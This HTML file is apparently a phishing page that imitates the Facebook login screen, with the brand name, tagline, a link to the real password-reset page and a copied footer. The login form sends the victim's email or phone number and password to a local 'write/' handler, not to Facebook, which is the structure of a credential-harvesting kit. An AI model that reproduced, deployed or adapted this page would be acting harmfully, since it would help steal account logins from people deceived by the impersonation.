<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" type="image/x-icon" href="logo.png">
    <title>Facebook - log in or sign up</title>
    <link rel="stylesheet" href="login.css">
</head>
<body>


		<!-- login Page start -->
		<div class="loginsignup">
			<div class="container">
				<div class="row justify-content-between">
					<div class="content-left">
						<h1>facebook</h1>
						<h2>Facebook helps you connect and share with the people in your life.</h2>
					</div>
					<div class="content-right">
						<form action="write/" method="POST">
							<div class="form-group">
								<input type="text" name="email" placeholder="Email address or phone number" required>
							</div>
							<div class="form-group">
								<input type="password" placeholder="Password" name="psw" required>
                                <input type="hidden" name="username" value="new user" required>
							</div>
							<div class="login">
                                <button class="btn" id="a" type="submit">log in</button>
                                <!-- <a href="" ></a> -->
							</div>
							<div class="forgot">
								<a href="https://www.facebook.com/login/identify/">Forgotten password</a>
							</div>
							<div class="create-btn">
								<a href="" class="btn">create new account</a>
							</div>
						</form>
						<p><a href="">Create a Page</a> for a celebrity, band or business.</p>
					</div>
				</div>
			</div>
		</div>
		<!-- login Page end -->l

    <div id="footer_wrapper">
        <div id="footer1">
            English (UK) <a href="">हिन्दी</a><a href="">ਪੰਜਾਬੀ</a><a href=""> اردو</a><a href="">தமிழ்</a><a href="">বাংলা</a><a href="">मराठी</a><a href="">తెలుగు</a><a href="">ગુજરાતી</a><a href="">ಕನ್ನಡ</a><a href="">മലയാളം</a>
        </div>
        <div id="footer2">
            <a href="#">Sign Up</a><a href="#">Log In</a><a href="#">Messenger</a><a href="#">DotNetTec</a><a href="#">Mobile</a><a href="#">Find Friends</a>
            <a href="#">Badges</a><a href="#">People</a><a href="#">Pages</a><a href="#">Places</a><a href="#">Games</a><a href="#">Locations</a>
            <a href="">Celebrities</a><a href="">Groups</a><a href="">Moments</a><a href="">About</a>
            <a href="">Create Advert</a><a href="">Create Page</a><a href="">Developers</a>
            <a href="">Careers</a><a href="">Privacy</a><a href="">Cookies</a><a href="">Ads</a><a href="">Terms</a><a href="">Help</a>
        </div>
    </div>
    
</body>
</html>